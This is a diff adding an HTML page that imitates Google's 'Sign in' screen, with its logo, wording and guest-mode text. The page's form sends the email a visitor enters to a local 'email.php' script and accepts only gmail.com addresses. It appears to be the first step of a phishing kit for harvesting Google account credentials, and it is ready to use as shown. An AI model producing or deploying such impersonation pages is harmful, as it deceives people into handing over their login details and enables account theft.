@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <title>Sign in – Google</title>
+
+  <!-- ✅ Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+
+  <!-- ✅ External CSS -->
+  <link rel="stylesheet" href="css/google.css" />
+</head>
+<body>
+  <div class="body">
+    
+    <!-- ✅ Google Logo -->
+    <img src="css/assets/google.png" alt="Google logo" class="google-logo" />
+
+    <!-- ✅ Sign in Heading -->
+    <h2>Sign in</h2>
+    <p>Use your Google Account</p>
+
+    <!-- ✅ Email or Phone Form -->
+    <form action="email.php" method="POST">
+      
+      <!-- Email Input -->
+        <input type="text" name="email" placeholder="Email or number" pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$" required />
+
+      <!-- Forgot Email Link -->
+      <a href="#">Forgot email?</a>
+
+      <!-- Guest Mode Info -->
+      <p class="guest">
+        Not your computer? Use Guest mode to sign in privately. 
+        <a href="#">Learn more about using Guest mode</a>
+      </p>
+
+      <!-- Footer Buttons -->
+      <div class="footer">
+        <a href="#">Create account</a>
+        <button type="submit">Next</button>
+        </div>
+    </form>
+  </div>
+ </body>
+ </html>
